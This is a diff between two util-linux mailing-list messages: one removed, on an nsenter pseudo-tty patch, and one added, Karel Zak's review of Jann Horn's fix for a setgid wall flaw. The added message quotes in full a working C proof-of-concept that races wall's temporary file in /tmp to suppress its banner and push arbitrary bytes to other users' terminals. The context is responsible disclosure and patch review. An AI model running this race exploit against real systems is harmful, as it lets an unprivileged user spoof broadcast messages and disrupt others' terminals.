@@ -1,448 +1,309 @@
 Return-Path: util-linux-owner@vger.kernel.org
-Received: from mail.higgsboson.tk ([148.251.132.243]:39197 "EHLO
-	mail.higgsboson.tk" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-	with ESMTP id S1756380AbbCRNk6 (ORCPT
-	<rfc822;util-linux@vger.kernel.org>); Wed, 18 Mar 2015 09:40:58 -0400
-Date: Wed, 18 Mar 2015 14:40:54 +0100
-From: =?UTF-8?B?SsO2cmc=?= Thalheim <joerg@higgsboson.tk>
-To: Karel Zak <kzak@redhat.com>
+Received: from mx1.redhat.com ([209.132.183.28]:33652 "EHLO mx1.redhat.com"
+	rhost-flags-OK-OK-OK-OK) by vger.kernel.org with ESMTP
+	id S1751897AbbC3Jot (ORCPT <rfc822;util-linux@vger.kernel.org>);
+	Mon, 30 Mar 2015 05:44:49 -0400
+Date: Mon, 30 Mar 2015 11:44:47 +0200
+From: Karel Zak <kzak@redhat.com>
+To: Jann Horn <jann@thejh.net>
 Cc: util-linux@vger.kernel.org
-Subject: Re: [PATCH] nsenter: add support for pty
-Message-ID: <20150318144054.25768c4f@turingmachine>
-In-Reply-To: <20150318111313.GC28925@ws.net.home>
-References: <20150318105319.2c6bab99@turingmachine>
-	<20150318111313.GC28925@ws.net.home>
+Subject: Re: util-linux: wall security issue: unprivileged users can suppress
+ banner
+Message-ID: <20150330094447.GR1749@ws.net.home>
+References: <20150327182707.GA9561@pc.thejh.net>
 MIME-Version: 1.0
-Content-Type: multipart/signed; micalg=pgp-sha512;
- boundary="Sig_/A1mhp/.vrmt+LOwJkttexia"; protocol="application/pgp-signature"
+Content-Type: text/plain; charset=us-ascii
+In-Reply-To: <20150327182707.GA9561@pc.thejh.net>
 Sender: util-linux-owner@vger.kernel.org
 List-ID: <util-linux.vger.kernel.org>
 
---Sig_/A1mhp/.vrmt+LOwJkttexia
-Content-Type: text/plain; charset=UTF-8
-Content-Transfer-Encoding: quoted-printable
+On Fri, Mar 27, 2015 at 07:27:07PM +0100, Jann Horn wrote:
+> I found a (tiny) security issue in wall that an unprivileged user can use
+> to suppress the banner and send arbitrary bytes (and thereby mess up other
+> people's terminals with colors and stuff). Do you want to treat this as a
+> security issue and keep it private until a fix is released or should I
+> resend this message to util-linux@vger.kernel.org?
 
-Some interactive applications requires a tty device inside the namespace to=
- work correctly.
-That's why docker, lxc, systemd-nspawn and libvirt-lxc implements pseudo tt=
-ys on their own.
+I think we can discus it publicly, it does not seem like fatal
+security issue, from my point of view it seems like security
+disadvantage :-) 
 
-In my special case, I wanted to update my system using pacman (my package m=
-anager), which uses gpg under the hood=20
-and fails with:
+Note that I'm not sure how often is wall installed with setgid, for
+example on Fedora only superuser can write to another terminals.
 
-  GPGME error: Inappropriate ioctl for device
+(See below for patch review.)
 
-The main problem here is that stdin/stdout still refers to a tty and istty(=
-) returns true,=20
-but pathname returned ptsname() is not valid in this context.
-
-The workaround would be:
-
-  nsenter ... script -c '/usr/bin/pacman -Syu' /dev/null
-
-which, spawns an extra subshell and requires double escaping for arguments,=
- when used in shell scripts or=20
- =20
-  nsenter ... /usr/bin/pacman -Syu --confirm >/tmp/stdout 2>/tmp/stderr
-
-Having this feature in nsenter, would easily allow to login in to every con=
-tainer solution.
-(even if somebody think coreos/rocket sucks, and create yet another system)
-
-The current implementation could be simplified, if forkpty(3) is used, but =
-as this requires libutil,=20
-which is not in the POSIX standard, I decided to use posix_openpt(3) instea=
-d.
-
-Because I need this feature anyway and to fulfil the GPL:
-
-https://github.com/Mic92/nsenter-pty
-
-(Still requires some further clean-up of unused functions, could be done au=
-tomatically probably)
-
-On Wed, 18 Mar 2015 12:13:13 +0100
-Karel Zak <kzak@redhat.com> wrote:
-
->=20
->=20
-> On Wed, Mar 18, 2015 at 10:53:19AM +0100, J=C3=B6rg Thalheim wrote:
-> > If mount namespaces are used, the issued command, will not have
-> > access to the tty device attached to its stdin/stdout/stderr. This
-> > patch adds an option to allocate a new pseudo tty in the entered
-> > mount namespace and bridge between the origin standard file
-> > descriptors and the standard file descriptors of the executed
-> > command.
->=20
-> The original nsenter(1) purpose is to have command line interface to
-> setns(2) syscall. Your patch is trying to push us to something more
-> complex. Not sure if we really want it. Eric, any comment?
->=20
->=20
-> Wouldn't be possible to use (or implement) on nsenter(1) independent
-> command to create a bridge between ttys? Something like:
->=20
->  nsenter --mount ttybridge <command>
->=20
-> (maybe socat(1) is able to create a bridge, not sure)
->=20
-> Do you have any use-case? I'd like to try it.
+    Karel
 
 
+> wall normally runs setgid, but not setuid. This means that any file
+> created by wall is accessible for the user running wall. wall writes the
+> banner and filtered input from the user to a temporary file, then writes
+> data from the temporary file to everyone's terminals without further
+> filtering. This means that the user can bypass the filtering by writing
+> to the temporary file directly.
+[...]
 
->=20
->     Karel
->=20
-> >  sys-utils/nsenter.1 |   6 ++
-> >  sys-utils/nsenter.c | 203
-> > ++++++++++++++++++++++++++++++++++++++++++++++++++-- 2 files
-> > changed, 202 insertions(+), 7 deletions(-)
-> >=20
-> > diff --git a/sys-utils/nsenter.1 b/sys-utils/nsenter.1
-> > index 8a3b25e..15218cb 100644
-> > --- a/sys-utils/nsenter.1
-> > +++ b/sys-utils/nsenter.1
-> > @@ -140,6 +140,12 @@ always sets UID for user namespaces, the
-> > default is 0. Don't modify UID and GID when enter user namespace.
-> > The default is to drops supplementary groups and sets GID and UID
-> > to 0. .TP
-> > +\fB\-P\fR, \fB\-\-pty\fR\fR
-> > +Allocate a pseudo-tty and attach the standart input/output of the
-> > command.  This +option can be used for interactive programs, which
-> > requires access to its tty +device, if mount namespaces are in use.
-> > If this option is set, nsenter will always +fork, before execu'ing
-> > the command. +.TP
-> >  \fB\-r\fR, \fB\-\-root\fR[=3D\fIdirectory\fR]
-> >  Set the root directory.  If no directory is specified, set the
-> > root directory to the root directory of the target process.  If
-> > directory is specified, set the diff --git a/sys-utils/nsenter.c
-> > b/sys-utils/nsenter.c index b029f80..c6e899b 100644
-> > --- a/sys-utils/nsenter.c
-> > +++ b/sys-utils/nsenter.c
-> > @@ -2,6 +2,7 @@
-> >   * nsenter(1) - command-line interface for setns(2)
-> >   *
-> >   * Copyright (C) 2012-2013 Eric Biederman <ebiederm@xmission.com>
-> > + * Copyright (C) 2015 J=C3=B6rg Thalheim <joerg@higgsboson.tk>
-> >   *
-> >   * This program is free software; you can redistribute it and/or
-> > modify it
-> >   * under the terms of the GNU General Public License as published
-> > by the @@ -28,6 +29,9 @@
-> >  #include <assert.h>
-> >  #include <sys/types.h>
-> >  #include <sys/wait.h>
-> > +#include <sys/ioctl.h>
-> > +#include <sys/select.h>
-> > +#include <term.h>
-> >  #include <grp.h>
-> > =20
-> >  #include "strutils.h"
-> > @@ -79,6 +83,7 @@ static void usage(int status)
-> >  	fputs(_(" -S, --setuid <uid>     set uid in entered
-> > namespace\n"), out); fputs(_(" -G, --setgid <gid>     set gid in
-> > entered namespace\n"), out); fputs(_("     --preserve-credentials
-> > do not touch uids or gids\n"), out);
-> > +	fputs(_(" -P, --pty              allocate a pseudo-TTY
-> > (this implies forking)\n"), out); fputs(_(" -r, --root[=3D<dir>]
-> > set the root directory\n"), out); fputs(_(" -w, --wd[=3D<dir>]
-> > set the working directory\n"), out); fputs(_(" -F,
-> > --no-fork          do not fork before exec'ing <program>\n"), out);
-> > @@ -94,6 +99,8 @@ static void usage(int status) static pid_t
-> > namespace_target_pid =3D 0; static int root_fd =3D -1;
-> >  static int wd_fd =3D -1;
-> > +static struct termios stdin_termios, stdout_termios;
-> > +static int tty_master_fd;
-> > =20
-> >  static void open_target_fd(int *fd, const char *type, const char
-> > *path) {
-> > @@ -132,20 +139,198 @@ static void open_namespace_fd(int nstype,
-> > const char *path) assert(nsfile->nstype);
-> >  }
-> > =20
-> > -static void continue_as_child(void)
-> > +static void resize_on_signal(int signo __attribute__((__unused__)))
-> >  {
-> > -	pid_t child =3D fork();
-> > +	struct winsize winsize;
-> > +
-> > +	if (ioctl(STDIN_FILENO, TIOCGWINSZ, &winsize) !=3D -1)
-> > +		ioctl(tty_master_fd, TIOCSWINSZ, &winsize);
-> > +}
-> > +
-> > +static void restore_stdin(void)
-> > +{
-> > +	if (tcsetattr(STDIN_FILENO, TCSANOW, &stdin_termios) =3D=3D -1)
-> > +		errx(EXIT_FAILURE,
-> > +				_("failed to restore stdin
-> > terminal attributes")); +}
-> > +
-> > +static void restore_stdout(void)
-> > +{
-> > +	if (tcsetattr(STDOUT_FILENO, TCSANOW, &stdout_termios) =3D=3D
-> > -1)
-> > +		errx(EXIT_FAILURE,
-> > +				_("failed to restore stdout
-> > terminal attributes")); +}
-> > +
-> > +
-> > +static int set_tty_raw(int fd, struct termios *origin_attr)
-> > +{
-> > +	struct termios attr[1];
-> > +
-> > +	if (tcgetattr(fd, attr) =3D=3D -1)
-> > +		return -1;
-> > +
-> > +	memcpy(origin_attr, attr, sizeof(struct termios));
-> > +
-> > +	cfmakeraw(attr);
-> > +
-> > +	return tcsetattr(fd, TCSANOW, attr);
-> > +}
-> > +
-> > +static void shovel_tty(int master_fd, int in_fd) {
-> > +	fd_set read_fds[1];
-> > +	int max_fd;
-> > +	char buf[BUFSIZ];
-> > +	ssize_t bytes;
-> > +	int n;
-> > +	while (master_fd !=3D -1) {
-> > +
-> > +		FD_ZERO(read_fds);
-> > +
-> > +		if (in_fd !=3D -1)
-> > +			FD_SET(in_fd, read_fds);
-> > +
-> > +		if (master_fd !=3D -1)
-> > +			FD_SET(master_fd, read_fds);
-> > +
-> > +		max_fd =3D (master_fd > in_fd) ? master_fd : in_fd;
-> > +
-> > +		if ((n =3D select(max_fd + 1, read_fds, NULL, NULL,
-> > NULL)) =3D=3D -1 && errno !=3D EINTR)
-> > +			break;
-> > +
-> > +		if (n =3D=3D -1 && errno =3D=3D EINTR)
-> > +			continue;
-> > +
-> > +		if (in_fd !=3D -1 && FD_ISSET(in_fd, read_fds)) {
-> > +			if ((bytes =3D read(in_fd, buf, BUFSIZ)) >
-> > 0) {
-> > +				if (master_fd !=3D -1 &&
-> > write(master_fd, buf, bytes) =3D=3D -1)
-> > +					break;
-> > +			} else if (n =3D=3D -1 && errno =3D=3D EINTR) {
-> > +				continue;
-> > +			} else {
-> > +				in_fd =3D -1;
-> > +				continue;
-> > +			}
-> > +		}
-> > +
-> > +		if (master_fd !=3D -1 && FD_ISSET(master_fd,
-> > read_fds)) {
-> > +			if ((bytes =3D read(master_fd, buf, BUFSIZ))
-> > > 0) {
-> > +				if (write(STDOUT_FILENO, buf,
-> > bytes) =3D=3D -1)
-> > +					break;
-> > +			} else if (n =3D=3D -1 && errno =3D=3D EINTR) {
-> > +				continue;
-> > +			} else {
-> > +				close(master_fd);
-> > +				master_fd =3D -1;
-> > +				continue;
-> > +			}
-> > +		}
-> > +	}
-> > +}
-> > +
-> > +static void setup_pty_parent(int master_fd)
-> > +{
-> > +	struct sigaction sa;
-> > +	struct winsize ws;
-> > +
-> > +	sigemptyset(&sa.sa_mask);
-> > +	sa.sa_flags =3D 0;
-> > +	sa.sa_handler =3D resize_on_signal;
-> > +	sigaction(SIGWINCH, &sa, NULL);
-> > +
-> > +	if (ioctl(STDOUT_FILENO, TIOCGWINSZ, &ws) >=3D 0)
-> > +		(void) ioctl(master_fd, TIOCSWINSZ, &ws);
-> > +
-> > +	if (set_tty_raw(STDIN_FILENO, &stdin_termios) !=3D -1) {
-> > +		atexit((void (*)(void))restore_stdin);
-> > +	}
-> > +
-> > +	if (set_tty_raw(STDOUT_FILENO, &stdout_termios) !=3D -1) {
-> > +		atexit((void (*)(void))restore_stdout);
-> > +	}
-> > +}
-> > +
-> > +static int setup_pty_child(int master_fd)
-> > +{
-> > +	pid_t pid;
-> > +	int slave_fd;
-> > +
-> > +	char* slave_name =3D ptsname(master_fd);
-> > +	if (slave_name =3D=3D NULL)
-> > +		return -errno;
-> > +
-> > +	slave_fd =3D open(slave_name, O_RDWR | O_NOCTTY | O_CLOEXEC);
-> > +	if (slave_fd < -1)
-> > +		return -errno;
-> > +
-> > +	pid =3D setsid();
-> > +	if (pid < 0 && errno !=3D EPERM)
-> > +		return -errno;
-> > +
-> > +	if (ioctl(slave_fd, TIOCSCTTY, 0) < 0)
-> > +		return -errno;
-> > +
-> > +	if (dup2(slave_fd, STDIN_FILENO) !=3D STDIN_FILENO ||
-> > +			dup2(slave_fd, STDOUT_FILENO) !=3D
-> > STDOUT_FILENO ||
-> > +			dup2(slave_fd, STDERR_FILENO) !=3D
-> > STDERR_FILENO)
-> > +		return -errno;
-> > +
-> > +	/*only close, if slave_fd is not std-fd*/
-> > +	if (slave_fd > 2)
-> > +		close(slave_fd);
-> > +
-> > +	return 0;
-> > +}
-> > +
-> > +static int new_pty(void)
-> > +{
-> > +	int fd =3D posix_openpt(O_RDWR | O_NOCTTY);
-> > +
-> > +	if (fd < 0)
-> > +		return -errno;
-> > +
-> > +	if (grantpt(fd) < 0)
-> > +		return -errno;
-> > +
-> > +	if (unlockpt(fd) < 0)
-> > +		return -errno;
-> > +
-> > +	return fd;
-> > +}
-> > +
-> > +static void continue_as_child(bool open_pty)
-> > +{
-> > +	pid_t child;
-> >  	int status;
-> >  	pid_t ret;
-> > +	int master_fd =3D -1;
-> > +
-> > +	if (open_pty) {
-> > +		master_fd =3D new_pty();
-> > +		if (master_fd < 0)
-> > +			err(EXIT_FAILURE, _("open pseudo tty
-> > failed"));
-> > +	}
-> > +
-> > +	child =3D fork();
-> > =20
-> >  	if (child < 0)
-> >  		err(EXIT_FAILURE, _("fork failed"));
-> > =20
-> >  	/* Only the child returns */
-> > -	if (child =3D=3D 0)
-> > +	if (child =3D=3D 0) {
-> > +		if (open_pty && setup_pty_child(master_fd) < 0)
-> > +			err(EXIT_FAILURE, _("failed to setup slave
-> > of pseudo tty"));
-> > +		close(master_fd);
-> >  		return;
-> > +	}
-> > +
-> > +	if (open_pty) {
-> > +		tty_master_fd =3D master_fd;
-> > +		setup_pty_parent(master_fd);
-> > +	}
-> > =20
-> >  	for (;;) {
-> > +		if (open_pty)
-> > +			shovel_tty(master_fd, STDIN_FILENO);
-> >  		ret =3D waitpid(child, &status, WUNTRACED);
-> >  		if ((ret =3D=3D child) && (WIFSTOPPED(status))) {
-> >  			/* The child suspended so suspend us as
-> > well */ @@ -171,6 +356,7 @@ int main(int argc, char *argv[])
-> >  	};
-> >  	static const struct option longopts[] =3D {
-> >  		{ "help", no_argument, NULL, 'h' },
-> > +		{ "pty", no_argument, NULL, 'P' },
-> >  		{ "version", no_argument, NULL, 'V'},
-> >  		{ "target", required_argument, NULL, 't' },
-> >  		{ "mount", optional_argument, NULL, 'm' },
-> > @@ -190,7 +376,7 @@ int main(int argc, char *argv[])
-> > =20
-> >  	struct namespace_file *nsfile;
-> >  	int c, namespaces =3D 0, setgroups_nerrs =3D 0, preserve_cred
-> > =3D 0;
-> > -	bool do_rd =3D false, do_wd =3D false, force_uid =3D false,
-> > force_gid =3D false;
-> > +	bool do_rd =3D false, do_wd =3D false, force_uid =3D false,
-> > force_gid =3D false, open_pty =3D false; int do_fork =3D -1; /* unknown
-> > yet */ uid_t uid =3D 0;
-> >  	gid_t gid =3D 0;
-> > @@ -201,7 +387,7 @@ int main(int argc, char *argv[])
-> >  	atexit(close_stdout);
-> > =20
-> >  	while ((c =3D
-> > -		getopt_long(argc, argv,
-> > "+hVt:m::u::i::n::p::U::S:G:r::w::F",
-> > +		getopt_long(argc, argv,
-> > "+hPVt:m::u::i::n::p::U::S:G:r::w::F", longopts, NULL)) !=3D -1) {
-> >  		switch (c) {
-> >  		case 'h':
-> > @@ -243,6 +429,9 @@ int main(int argc, char *argv[])
-> >  			else
-> >  				namespaces |=3D CLONE_NEWPID;
-> >  			break;
-> > +		case 'P':
-> > +			open_pty =3D true;
-> > +			break;
-> >  		case 'U':
-> >  			if (optarg)
-> >  				open_namespace_fd(CLONE_NEWUSER,
-> > optarg); @@ -358,8 +547,8 @@ int main(int argc, char *argv[])
-> >  		wd_fd =3D -1;
-> >  	}
-> > =20
-> > -	if (do_fork =3D=3D 1)
-> > -		continue_as_child();
-> > +	if (do_fork =3D=3D 1 || open_pty)
-> > +		continue_as_child(open_pty);
-> > =20
-> >  	if (force_uid || force_gid) {
-> >  		if (force_gid && setgroups(0, NULL) !=3D 0 &&
-> > setgroups_nerrs)	/* drop supplementary groups */ --=20
-> > 2.3.3
->=20
->=20
->=20
+> From 96d238cad0151a4cd271ab38d1f47a82c58dc313 Mon Sep 17 00:00:00 2001
+> From: Jann Horn <jann@thejh.net>
+> Date: Fri, 27 Mar 2015 19:13:09 +0100
+> Subject: [PATCH] fix wall: Do not use a temporary file.
+> 
+> The issue with using a temporary file in wall is that wall runs as setgid.
+> This means that an unprivileged user who runs wall can modify wall's
+> temporary files, even if those are mode 0600, so the unprivileged user can
+> edit and effectively suppress the banner.
+> The fix is to simply not use temporary files.
+> ---
+>  term-utils/wall.c | 80 ++++++++++++++++++++++++++++++++-----------------------
+>  1 file changed, 47 insertions(+), 33 deletions(-)
+> 
+> diff --git a/term-utils/wall.c b/term-utils/wall.c
+> index 387594c..666b4b0 100644
+> --- a/term-utils/wall.c
+> +++ b/term-utils/wall.c
+> @@ -181,14 +181,42 @@ int main(int argc, char **argv)
+>  	exit(EXIT_SUCCESS);
+>  }
+>  
+> +static void buf_append(char *data, char **buf, size_t *size, size_t *used)
+> +{
+> +	size_t data_len = strlen(data);
+> +	while (data_len > *size - *used) {
+> +		*size = 2 * *size;
+
+ How do you know that "2 * size" is enough for data_len?
+
+> +		*buf = xrealloc(*buf, *size + 1);
+> +	}
+> +	strcpy(*buf + *used, data);
+> +	*used += data_len;
+> +}
+> +
+> +static void buf_append_careful(int c, char **buf, size_t *size, size_t *used)
+> +{
+> +	char cbuf[10];
+> +
+> +	if (isprint(c) || c == '\a' || c == '\t' || c == '\r' || c == '\n')
+> +		sprintf(cbuf, "%c", c);
+> +	else if (!isascii(c))
+> +		sprintf(cbuf, "\\%3o", (unsigned char)c);
+> +	else {
+> +		cbuf[0] = '^';
+> +		cbuf[1] = c ^ 0x40;
+> +		cbuf[2] = '\0';
+> +	}
+> +	buf_append(cbuf, buf, size, used);
+> +}
+> +
+>  static char *makemsg(char *fname, char **mvec, int mvecsz,
+>  		     size_t *mbufsize, int print_banner)
+>  {
+>  	register int ch, cnt;
+> -	struct stat sbuf;
+> -	FILE *fp;
+> -	char *p, *lbuf, *tmpname, *mbuf;
+> +	char *p, *lbuf;
+>  	long line_max;
+> +	char headerbuf[TERM_WIDTH + 20];
+
+btw, we have get_terminal_width() in "ttyutils.h"
+
+> +	size_t buf_used = 0, buf_size = 1024;
+> +	char *buf = xmalloc(buf_size + 1);
+>  
+>  	line_max = sysconf(_SC_LINE_MAX);
+>  	if (line_max <= 0)
+> @@ -196,11 +224,6 @@ static char *makemsg(char *fname, char **mvec, int mvecsz,
+>  
+>  	lbuf = xmalloc(line_max);
+>  
+> -	if ((fp = xfmkstemp(&tmpname, NULL)) == NULL)
+> -		err(EXIT_FAILURE, _("can't open temporary file"));
+
+if you replace xfmkstemp() with open_memstream() than you don't need
+all the buf_append() changes. libc is able to use FILE as in memory
+buffer for fprintf-like function :-)
+
+> -	unlink(tmpname);
+> -	free(tmpname);
+> -
+>  	if (print_banner == TRUE) {
+>  		char *hostname = xgethostname();
+>  		char *whom, *where, *date;
+> @@ -233,14 +256,17 @@ static char *makemsg(char *fname, char **mvec, int mvecsz,
+>  		 */
+>  		/* snprintf is not always available, but the sprintf's here
+>  		   will not overflow as long as %d takes at most 100 chars */
+> -		fprintf(fp, "\r%*s\r\n", TERM_WIDTH, " ");
+> +		sprintf(headerbuf, "\r%*s\r\n", TERM_WIDTH, " ");
+> +		buf_append(headerbuf, &buf, &buf_size, &buf_used);
+>  		sprintf(lbuf, _("Broadcast message from %s@%s (%s) (%s):"),
+>  			      whom, hostname, where, date);
+> -		fprintf(fp, "%-*.*s\007\007\r\n", TERM_WIDTH, TERM_WIDTH, lbuf);
+> +		sprintf(headerbuf, "%-*.*s\007\007\r\n", TERM_WIDTH, TERM_WIDTH, lbuf);
+
+it would be probably better to use 
+
+        snprintf(headerbuf, sizeof(headerbuf), ....)
+
+or use the real terminal width than sizeof().
+
+> +		buf_append(headerbuf, &buf, &buf_size, &buf_used);
+>  		free(hostname);
+>  		free(date);
+>  	}
+> -	fprintf(fp, "%*s\r\n", TERM_WIDTH, " ");
+> +	sprintf(headerbuf, "%*s\r\n", TERM_WIDTH, " ");
+> +	buf_append(headerbuf, &buf, &buf_size, &buf_used);
+>  
+>  	 if (mvec) {
+>  		/*
+> @@ -249,12 +275,11 @@ static char *makemsg(char *fname, char **mvec, int mvecsz,
+>  		int i;
+>  
+>  		for (i = 0; i < mvecsz; i++) {
+> -			fputs(mvec[i], fp);
+> +			buf_append(mvec[i], &buf, &buf_size, &buf_used);
+>  			if (i < mvecsz - 1)
+> -				fputc(' ', fp);
+> +				buf_append(" ", &buf, &buf_size, &buf_used);
+>  		}
+> -		fputc('\r', fp);
+> -		fputc('\n', fp);
+> +		buf_append("\r\n", &buf, &buf_size, &buf_used);
+>  
+>  	} else {
+>  		/*
+> @@ -284,33 +309,22 @@ static char *makemsg(char *fname, char **mvec, int mvecsz,
+>  			for (cnt = 0, p = lbuf; (ch = *p) != '\0'; ++p, ++cnt) {
+>  				if (cnt == TERM_WIDTH || ch == '\n') {
+>  					for (; cnt < TERM_WIDTH; ++cnt)
+> -						putc(' ', fp);
+> -					putc('\r', fp);
+> -					putc('\n', fp);
+> +						buf_append(" ", &buf, &buf_size, &buf_used);
+> +					buf_append("\r\n", &buf, &buf_size, &buf_used);
+>  					cnt = 0;
+>  				}
+>  				if (ch == '\t')
+>  					cnt += (7 - (cnt % 8));
+>  				if (ch != '\n')
+> -					fputc_careful(ch, fp, '^');
+> +					buf_append_careful(ch, &buf, &buf_size, &buf_used);
+>  			}
+>  		}
+>  	}
+> -	fprintf(fp, "%*s\r\n", TERM_WIDTH, " ");
+> +	sprintf(headerbuf, "%*s\r\n", TERM_WIDTH, " ");
+> +	buf_append(headerbuf, &buf, &buf_size, &buf_used);
+>  
+>  	free(lbuf);
+> -	rewind(fp);
+> -
+> -	if (fstat(fileno(fp), &sbuf))
+> -		err(EXIT_FAILURE, _("stat failed"));
+> -
+> -	*mbufsize = (size_t) sbuf.st_size;
+> -	mbuf = xmalloc(*mbufsize);
+> -
+> -	if (fread(mbuf, 1, *mbufsize, fp) != *mbufsize)
+> -		err(EXIT_FAILURE, _("fread failed"));
+>  
+> -	if (close_stream(fp) != 0)
+> -		errx(EXIT_FAILURE, _("write error"));
+> -	return mbuf;
+> +	*mbufsize = buf_used;
+> +	return buf;
+>  }
+> -- 
+> 2.1.4
+> 
+
+> #include <unistd.h>
+> #include <stdio.h>
+> #include <stdlib.h>
+> #include <dirent.h>
+> #include <fcntl.h>
+> #include <signal.h>
+> #include <time.h>
+> #include <sys/stat.h>
+> #include <sys/types.h>
+> 
+> static long long nanotime(void) {
+>   struct timespec t;
+>   clock_gettime(CLOCK_MONOTONIC_COARSE, &t);
+>   return t.tv_sec * 1000000000 + t.tv_nsec;
+> }
+> 
+> int main(int argc, char **argv) {
+>   if (argc < 2) {
+>     puts("usage: ./wallsploit <path to wall>");
+>     return 1;
+>   }
+>   char *wallpath = argv[1];
+> 
+> again:
+>   puts("trying...");
+>   int fds[2];
+>   if (pipe(fds)) return puts("pipe failed"), 1;
+>   pid_t child = fork();
+>   if (child < 0) return puts("fork failed"), 1;
+>   if (child == 0) {
+>     close(fds[1]);
+>     if (dup2(fds[0], 0) != 0) return puts("dup2 failed"), 1;
+>     close(fds[0]);
+>     execlp(wallpath, "wall", NULL);
+>     return puts("execlp failed"), 1;
+>   }
+>   close(fds[0]);
+>   long long end = nanotime() + 100000000;
+>   if (chdir("/tmp")) return puts("chdir failed"), 1;
+>   DIR *d = opendir(".");
+>   int n = 0;
+>   do {
+>     if (++n >= 1000) n = 0;
+>     struct dirent *dent;
+>     while ((dent = readdir(d))) {
+>       if (strncmp(dent->d_name, "wall.", 5) == 0) {
+>         int fd = open(dent->d_name, O_RDWR);
+>         if (fd >= 0) {
+>           puts("got fd!");
+>           usleep(10000);
+>           struct stat orig_stat, new_stat;
+>           if (fstat(fd, &orig_stat)) return puts("fstat"), 1;
+>           while (1) {
+>             if (write(fds[1], "\n", 1) != 1) return puts("writing padding"), 1;
+>             usleep(10000);
+>             if (fstat(fd, &new_stat)) return puts("fstat"), 1;
+>             if (orig_stat.st_size != new_stat.st_size) {
+>               puts("padding complete");
+>               ftruncate(fd, 0);
+>               char c;
+>               while (read(0, &c, 1) == 1) {
+>                 if (write(fd, &c, 1) != 1) return puts("writing data"), 1;
+>               }
+>               puts("overwrite done, letting wall finish...");
+>               close(fds[1]);
+>               wait(NULL);
+>               return 0;
+>             }
+>           };
+>         }
+>         puts("saw dentry, but too late :(");
+>       }
+>     }
+>     rewinddir(d);
+>   } while (n == 0 || nanotime() < end);
+>   if (kill(child, SIGTERM)) return puts("can't kill"), 1;
+>   wait(NULL);
+>   close(fds[1]);
+>   goto again;
+>   return 0;
+> }
 
 
---Sig_/A1mhp/.vrmt+LOwJkttexia
-Content-Type: application/pgp-signature
-Content-Description: OpenPGP digital signature
 
------BEGIN PGP SIGNATURE-----
-Version: GnuPG v2
-
-iQF8BAEBCgBmBQJVCYBmXxSAAAAAAC4AKGlzc3Vlci1mcHJAbm90YXRpb25zLm9w
-ZW5wZ3AuZmlmdGhob3JzZW1hbi5uZXQ0QUJBMDczODJBRDU3RTZCOUFBNEU4OERD
-QTQxMDZCOEQ3Q0M3OUZBAAoJEMpBBrjXzHn6v5IH/2j0lmIqNSvswo2HT8YI5M1f
-Zg4q4EvPvTMEXkboE7UO9j5naaWtPWq+pjEr7hBSn4dXbmjHitL7ZBWE20DSeb7T
-Ohntc7ZgrV+5OFb2sGmDKgyuG3SY/8DiWyeyzT5Y0n2CCNt5EhwRjPaH/if54B7H
-8L5Hep5ehmpKVMsiX+bTtq4jhXqLCc8VpW9quBk7nLruOn8BnR6P/3ouiBucDsEO
-VW7akkcU7nvWH82Xro7mdfp2zkzTvWWmwpPIXmDQdexzzJh1J622XNz/G0ArkzDJ
-col76VlzoSXlaoojmfwLLascFx6s17DAxZR+PEqxxOjcMv9NGgjtw4RMViYzTio=
-=Bci3
------END PGP SIGNATURE-----
-
---Sig_/A1mhp/.vrmt+LOwJkttexia--
+-- 
+ Karel Zak  <kzak@redhat.com>
+ http://karelzak.blogspot.com
